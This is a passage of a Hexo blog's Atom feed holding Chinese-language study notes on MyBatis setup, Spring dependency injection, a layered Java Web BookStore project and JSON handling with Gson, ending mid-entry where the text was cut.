<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xorex</title>
  
  <subtitle>要成为世界上最幸福的人啊！</subtitle>
  <link href="https://xorex.space/atom.xml" rel="self"/>
  
  <link href="https://xorex.space/"/>
  <updated>2021-04-15T13:52:42.659Z</updated>
  <id>https://xorex.space/</id>
  
  <author>
    <name>Xorex</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MyBatis 基础与配置</title>
    <link href="https://xorex.space/2022/01/01/2dfc14c136d8/"/>
    <id>https://xorex.space/2022/01/01/2dfc14c136d8/</id>
    <published>2022-01-01T11:56:51.000Z</published>
    <updated>2021-04-15T13:52:42.659Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>暂时放弃更新，等学完 MyBatis 再好好总结！！！</p></blockquote><h2 id="MyBatis-概述"><a href="#MyBatis-概述" class="headerlink" title="MyBatis 概述"></a>MyBatis 概述</h2><p>Mybatis 是一种持久层的框架，通过建立接口的方法和 XML 注册的 SQL 语句的映射关系来实现对数据库的操作。</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="获取数据库连接之前"><a href="#获取数据库连接之前" class="headerlink" title="获取数据库连接之前"></a>获取数据库连接之前</h3><p>首先获取数据库的连接实例 SqlSession 的连接池 SqlSessionFactory：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory factory; <span class="comment">//连接池</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String resource=<span class="string">&quot;MyBatis-config.xml&quot;</span>; <span class="comment">//连接池的配置文件</span></span><br><span class="line">        InputStream inputstream = Resources.getResourceAsStream(resource); <span class="comment">//将配置文件读入流中</span></span><br><span class="line">        factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputstream); <span class="comment">//按照配置文件建造 SqlSession 连接池</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSession</span><span class="params">()</span> </span>&#123; <span class="comment">//从连接池获取连接</span></span><br><span class="line">        <span class="keyword">return</span> factory.openSession();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>获取连接池需要在服务器启动的时候进行，所以放到静态代码块里面执行。上面的 <code>SqlSessionFactoryBuilder</code> 作用就是按照配置文件建造连接池，此实例用完就扔，所以不给外部引用，让 GC 把它回收了。留着 <code>SqlSessionFactory</code> 作为单独一个连接池管理 SQL 连接。</p><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><p>在 <code>MyBatis-config.xml</code> 连接池配置中加入数据库连接环境，其中 <code>&lt;property&gt;</code> 标签中的 value 中依次填入所有的信息即可。</p><p>或者外部引入一个 properties 文件，里面写上数据库连接数据，然后用 <code>$&#123;PropertyName&#125;</code> 的方式引用。</p><p>外部文件 <code>DataBase.properties</code>：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><p>然后配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;DataBase.properties&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> <span class="comment">&lt;!--引入外部的文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="建立-DAO-层方法和-SQL-语句的映射"><a href="#建立-DAO-层方法和-SQL-语句的映射" class="headerlink" title="建立 DAO 层方法和 SQL 语句的映射"></a>建立 DAO 层方法和 SQL 语句的映射</h3><p>DAO 层的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUsers</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">addUser</span><span class="params">(User user)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">updateUser</span><span class="params">(User user)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">deleteUserByUserName</span><span class="params">(String userName)</span></span>;</span><br><span class="line">    <span class="function">User <span class="title">queryUserById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line">    <span class="function">User <span class="title">queryUserByUserName</span><span class="params">(String userName)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建数据库操作接口映射的 XML 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;space.xorex.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;space.xorex.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意上面的 <code>namespace</code> 是下方的 SQL 语句映射的<strong>执行方法</strong>名称所在的定义空间（就是定义这些方法的接口），接口只能写完整的类名，不可以用别名。然后每一条就是执行方法映射的 SQL 语句。</p><p>对于这些映射标签，比如下面的，就一定要注意对应的接口方法名称的 参数 和 返回值，写对应的信息，而对于常见的数据类型，MyBatis 进行了别名映射，可以<strong>不区分大小写</strong>的使用这些别名。然后就是占位符的填充，使用 <code>#&#123;&#125;</code> 里面写数据名，是从 parameterType 中寻找的。</p><p>如果为 Java 设置的 Java 内置数据类型（基本数据 + String + Map + List 之类的），则使用参数名即可，比如下面的 <code>#&#123;userName&#125;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByUserName&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;space.xorex.pojo.User&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--这里 string 就是一个规定好的 java.lang.String 的别名--&gt;</span></span><br><span class="line">    select *</span><br><span class="line">    from user</span><br><span class="line">    where userName=#&#123;userName&#125;; <span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;暂时放弃更新，等学完 MyBatis 再好好总结！！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;MyBatis-概述&quot;&gt;&lt;a href=&quot;#MyBatis-概述&quot; class=&quot;headerlink&quot; title=&quot;MyBatis 概述</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="MyBatis" scheme="https://xorex.space/tags/MyBatis/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架学习笔记</title>
    <link href="https://xorex.space/2022/01/01/d68ebc25d776/"/>
    <id>https://xorex.space/2022/01/01/d68ebc25d776/</id>
    <published>2022-01-01T09:53:05.000Z</published>
    <updated>2021-04-15T13:28:05.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于-Spring-框架"><a href="#关于-Spring-框架" class="headerlink" title="关于 Spring 框架"></a>关于 Spring 框架</h2><blockquote><p>暂时放弃更新，完全学完 Spring 之后再来总结。</p></blockquote><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><h3 id="set-方法属性注入"><a href="#set-方法属性注入" class="headerlink" title="set 方法属性注入"></a>set 方法属性注入</h3><p>具体方法就是使用 IOC 获取到对象之后，调用对象的 setXXX() 方法设置属性。</p><h3 id="lt-property-gt-注入"><a href="#lt-property-gt-注入" class="headerlink" title="&lt;property&gt; 注入"></a>&lt;property&gt; 注入</h3><p>在 Spring 的 Bean XML 文件的 <code>&lt;bean&gt;&lt;/bean&gt;</code> 标签里面添加属性标签，<code>&lt;property&gt;</code> 标签内部有属性 name 和 value，用于设置属性值。这种方法本质上使用的是 <strong>setXXX()</strong> 方法完成的。</p><h3 id="lt-constructor-arg-gt-注入"><a href="#lt-constructor-arg-gt-注入" class="headerlink" title="&lt;constructor-arg&gt; 注入"></a>&lt;constructor-arg&gt; 注入</h3><p>在 Spring 的 Bean XML 文件的 <code>&lt;bean&gt;&lt;/bean&gt;</code> 标签里面添加属性标签，<code>&lt;constructor-arg&gt;</code> 标签内部有属性 name 和 value，用于设置属性值。这种方法本质上使用的 <strong>构造方法</strong> 完成的，使用的时候一定要检查以下所对应的构造方法是否正确。</p><h3 id="p-名称空间注入"><a href="#p-名称空间注入" class="headerlink" title="p 名称空间注入"></a>p 名称空间注入</h3><p>本质上使用 <strong>getXXX()</strong> 方法完成的，首先需要在 xml 头添加一条固定的属性：<code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code> 然后就可以在 <code>&lt;bean&gt;</code> 里面通过给属性 <code>p:XXX</code> 来 set 对象的属性值了（这里 XXX 为对象属性名称）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于-Spring-框架&quot;&gt;&lt;a href=&quot;#关于-Spring-框架&quot; class=&quot;headerlink&quot; title=&quot;关于 Spring 框架&quot;&gt;&lt;/a&gt;关于 Spring 框架&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;暂时放弃更新，完全学完 Sprin</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Spring" scheme="https://xorex.space/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>BookStore 项目记录</title>
    <link href="https://xorex.space/2021/04/15/fc2cd7d811c5/"/>
    <id>https://xorex.space/2021/04/15/fc2cd7d811c5/</id>
    <published>2021-04-15T13:22:29.000Z</published>
    <updated>2021-04-15T16:39:40.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我跟着视频做了一个小小的-Java-Web-项目这件事"><a href="#关于我跟着视频做了一个小小的-Java-Web-项目这件事" class="headerlink" title="关于我跟着视频做了一个小小的 Java Web 项目这件事"></a>关于我跟着视频做了一个小小的 Java Web 项目这件事</h2><blockquote><p>其实这个项目已经很久之前就做好了，但是由于各种的拖延症，导致了现在才开始总结，不过应该没有遗忘太多，所以还好。</p></blockquote><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>大概的结构：</p><p><img src="https://xorex.space/image/216.jpg" alt="项目结构"></p><p>项目的思路就是 MVC 分层，分为 Model View Controller 三层，然后分别完成对应的任务。</p><h3 id="DAO-层"><a href="#DAO-层" class="headerlink" title="DAO 层"></a>DAO 层</h3><p>持久化层比较让我记忆深刻的就是使用了 JDBCUtils BaseDao DetialsDao 三层来实现代码复用和解耦。</p><p><img src="https://xorex.space/image/217.jpg" alt="DAO"></p><ol><li>首先使用 JDBCUtils 工具类来负责数据库连接池的创建和管理，用于外界控制获取数据库连接和事务的实现，专注于和数据库的直接联系：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DruidDataSource source;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        source=getDruidDataSource() <span class="comment">//创建阿里的 Druid 连接池</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span></span>; <span class="comment">//管理数据库连接的获取</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commitAndClose</span><span class="params">()</span></span>; <span class="comment">//事务的提交</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rollBackAndClose</span><span class="params">()</span></span>; <span class="comment">//事务的回滚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>然后使用了 BaseDao 对最基本的数据库交互做了封装，这里基本交互是指根据 SQL 查寻的返回值类型抽象出来一类查询，并使用了 DBUtils 来作为 SQL 查询结果和 Java Bean 数据封装之间转换的桥梁。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为影响行数 int 的更新交互</span></span><br><span class="line">    <span class="keyword">protected</span>  &lt;T&gt; <span class="function">T <span class="title">queryForOne</span><span class="params">(Class&lt;T&gt; type,String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为单个类实例的查询交互</span></span><br><span class="line">    <span class="keyword">protected</span>  &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">queryForList</span><span class="params">(Class&lt;T&gt; type, String SQL, Object ... args)</span></span>; <span class="comment">//返回类型为多个类实例的查询交互</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">queryForSingleValue</span><span class="params">(String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为单个基本数据类型的查询交互</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>最后就是我们业务需要的针对于具体表的 SQL 执行的 DAO 了，只需要继承于 BaseDao 来复用基本数据库交互代码，自己只需要专注于构造具体业务的 SQL 语句即可，执行交给前两层。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Book <span class="title">queryBookByID</span><span class="params">(Integer id)</span> </span>&#123; <span class="comment">//具体的业务所需 DAO</span></span><br><span class="line">    String SQL=<span class="string">&quot;select * from Books where id=?;&quot;</span>; <span class="comment">//专注于 SQL 语句构造</span></span><br><span class="line">    <span class="keyword">return</span> queryForOne(Book.class, SQL, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Book&gt; <span class="title">queryAllBooks</span><span class="params">()</span> </span>&#123; <span class="comment">//具体的业务所需 DAO</span></span><br><span class="line">    String SQL=<span class="string">&quot;select * from Books;&quot;</span>; <span class="comment">//专注于 SQL 语句构造</span></span><br><span class="line">    <span class="keyword">return</span> queryForList(Book.class, SQL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Service-层"><a href="#Service-层" class="headerlink" title="Service 层"></a>Service 层</h3><p>Service 层，主要任务就是通过调用 DAO 层，来实现项目的一个个最小单位的服务，用于提供给 Servlet 层组合调用，完成一个 Web 请求的执行。比如下面的都是关于订单的最小单位的服务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">createOrder</span><span class="params">(Cart cart,Integer userId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">showAllOrders</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendOrder</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receiveOrder</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Order <span class="title">showOrderDetials</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">showUserOrders</span><span class="params">(Integer userId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xorex.space/image/218.jpg" alt="Service"></p><h3 id="Servlet-层"><a href="#Servlet-层" class="headerlink" title="Servlet 层"></a>Servlet 层</h3><p>Servlet 层主要是对用户发起的 Web 请求进行处理，通过组合调用 Service 层来实现这个请求。这里最亮眼的就是使用了反射来管理大量的请求。</p><p>首先创建一个 BaseServlet 来管理的 post get 请求，然后外部在发起请求的时候，带上需要处理请求的 Servlet 程序的名字。请求发送到 BaseServlet 之后，就会根据带来的 Servlet 程序名称通过反射调用对应的 Servlet 的方法，来完成请求处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    Method method=<span class="keyword">this</span>.getClass().getDeclaredMethod(req.getParameter(<span class="string">&quot;service&quot;</span>), HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line">    method.invoke(<span class="keyword">this</span>,req,resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后其他的所有的 Servlet 类继承这个 BaseServlet，就能通过反射被调用自己的业务方法了。因为被继承之后，反射代码是在每一个子类里面执行的，所以也不需要担心方法名和其他 Servlet 程序重名的问题。</p><p><img src="https://xorex.space/image/219.jpg" alt="Servlet"></p><h3 id="POJO-目录"><a href="#POJO-目录" class="headerlink" title="POJO 目录"></a>POJO 目录</h3><p>这里先来讨论以下关于 POJO 和 Java Bean 的关系。</p><p>POJO <code>Plain Ordinary Java Object</code> 指的是简单普通的 Java 对象，只有<strong>纯粹</strong>的 setter/getter 方法的类被称为 POJO。这里的存粹就是只能有这两种方法，POJO 一般作为数据的载体。</p><p>Java Bean 则具有严格的规范，</p><ol><li><p>所有的实例变量都应该是 private 类型（封装原则）</p></li><li><p>需要提供 public 修饰的无参构造方法（为了创建实例）</p></li><li><p>为 private 修饰的字段提供 setter/getter （为了获取和设置字段的值）</p></li></ol><p>当然只需要满足上面三点即可，意味着 Java Bean 里面可以有除了 setter/getter 以外的方法（toString、hashCode 等），也可以实现各种接口（Serializable 等）</p><p>这里总结一下就是这两个东西很相近，但是又不兼容，POJO 专注于数据的简单存取，而 Java Bean 不仅仅能数据存取，还能进行简单的数据处理。</p><p>所以在项目里面这个层的作用就是</p><p><img src="https://xorex.space/image/220.jpg" alt="POJO"></p><h3 id="Utils-目录"><a href="#Utils-目录" class="headerlink" title="Utils 目录"></a>Utils 目录</h3><p>里面主要是两个常用的代码封装的工具，一个是关于 JDCB 代码封装的 JDBCUtils，另外一个是将请求字符串数据转化为其他类型的 WebUtils 。</p><p><img src="https://xorex.space/image/221.jpg" alt="Utils"></p><h2 id="项目感受"><a href="#项目感受" class="headerlink" title="项目感受"></a>项目感受</h2><blockquote><p>其实这个可以说是我写代码以来第一个真正意义上的项目了（Python 哪个小游戏算半抄半写的，基本上没学到啥东西），写这个更多意义上是想要做一个总结，当然可能是因为里面很多东西在做项目的时候都已经想明白了，所以这个总结也没多大的学习方面的作用。但是还是觉得想要把它认真的记录下来，留作纪念吧。</p></blockquote><p>项目地址：<code>https://github.com/Administrator-Xorex/BookStore.git</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我跟着视频做了一个小小的-Java-Web-项目这件事&quot;&gt;&lt;a href=&quot;#关于我跟着视频做了一个小小的-Java-Web-项目这件事&quot; class=&quot;headerlink&quot; title=&quot;关于我跟着视频做了一个小小的 Java Web 项目这件事&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="项目记录" scheme="https://xorex.space/categories/%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Java Web" scheme="https://xorex.space/tags/Java-Web/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb 商城项目总结</title>
    <link href="https://xorex.space/2021/04/13/93c372cc6323/"/>
    <id>https://xorex.space/2021/04/13/93c372cc6323/</id>
    <published>2021-04-13T11:58:42.000Z</published>
    <updated>2021-04-13T11:58:42.327Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>JSON 和 AJAX</title>
    <link href="https://xorex.space/2021/04/12/f53c59e23e61/"/>
    <id>https://xorex.space/2021/04/12/f53c59e23e61/</id>
    <published>2021-04-12T06:52:42.000Z</published>
    <updated>2021-04-14T09:54:34.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>关于 JSON 本身的一些信息，可以在：<a href="https://www.xmind.net/m/rc4VPM/">JSON 和 XML 思维导图</a> 查看，这里不在叙述。</p><h3 id="JavaScript-Object-lt-gt-String"><a href="#JavaScript-Object-lt-gt-String" class="headerlink" title="JavaScript Object &lt;-&gt; String"></a>JavaScript Object &lt;-&gt; String</h3><p>在 JavaScript 中，JSON 本身是一个对象，以访问属性的方式访问 JSON 里面的键值对:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> json=&#123;</span><br><span class="line">        <span class="string">&quot;Tempest&quot;</span> : <span class="string">&quot;Xorex&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Yukinoshita&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Yukino&quot;</span>,</span><br><span class="line">            <span class="string">&quot;age&quot;</span> : <span class="number">18</span>,</span><br><span class="line">            <span class="string">&quot;height&quot;</span> : <span class="number">168</span>,</span><br><span class="line">            <span class="string">&quot;log&quot;</span> : [<span class="string">&quot;Yukinoshita&quot;</span>,<span class="string">&quot;Yukino&quot;</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Yuuki&quot;</span> : <span class="string">&quot;Asuna&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">String</span>=json.Tempest;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">Array</span>=json.Yukinoshita.log;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于前后端进行数据传输的过程中，使用的就是 JSON 字符串进行传输，然后再解析成对象进行使用。在 JS 中对象转字符串使用：<code>JSON.stringify()</code> ，将字符串转为 JSON 使用 <code>JSON.parse()</code> 。</p><h3 id="Java-Object-lt-gt-String"><a href="#Java-Object-lt-gt-String" class="headerlink" title="Java Object &lt;-&gt; String"></a>Java Object &lt;-&gt; String</h3><p>在 Java 端，则使用 Google 提供的 Gson 包的 Gson 对象来对 JSON 进行状态转换。</p><h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>使用对于 JavaBean 来说，只需要在使用 <code>fromJson(String,Class)</code> 生成对象的时候传入 JavaBean 的 Class 对象即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User userTempest=<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>);</span><br><span class="line">Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">String jsonString=gson.toJson(userTempest);</span><br><span class="line">User jsonBean=gson.fromJson(jsonString, User.class);</span><br><span class="line">System.out.println(jsonString);</span><br><span class="line">System.out.println(jsonBean);</span><br></pre></td></tr></table></figure><h4 